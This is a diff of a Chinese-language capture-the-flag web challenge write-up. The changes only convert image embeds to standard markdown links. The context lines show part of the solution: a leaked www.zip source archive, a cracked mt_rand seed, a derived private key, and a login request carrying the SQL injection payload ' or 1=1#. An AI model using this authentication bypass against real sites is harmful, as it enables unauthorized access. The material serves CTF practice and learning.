@@ -1,12 +1,12 @@
-![[Pasted image 20230213102900.png|500]]
+![](<./img/Pasted image 20230213102900.png>)
 
 ```
 /
 ```
 
-![[Pasted image 20230213103023.png|700]]
+![](<./img/Pasted image 20230213103023.png>)
 
-![[Pasted image 20230213103942.png|700]]
+![](<./img/Pasted image 20230213103942.png>)
 
 ```
 /www.zip
@@ -89,7 +89,7 @@ for char in output:
 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61
 ```
 
-![[Pasted image 20230213111218.png|700]]
+![](<./img/Pasted image 20230213111218.png>)
 
 得到种子为`1775196155`
 
@@ -141,7 +141,7 @@ echo private_key();
 ?>
 ```
 
-![[Pasted image 20230213112636.png|300]]
+![](<./img/Pasted image 20230213112636.png>)
 
 获得私钥`XuNhoueCDCGc`
 
@@ -149,6 +149,6 @@ echo private_key();
 login=1&username=111&password=' or 1=1#&Private_key=XuNhoueCDCGc
 ```
 
-![[Pasted image 20230213114134.png|1000]]
+![](<./img/Pasted image 20230213114134.png>)
 
 #Web #PHP #源码泄漏 #目录扫描 #代码审计 #mt_rand
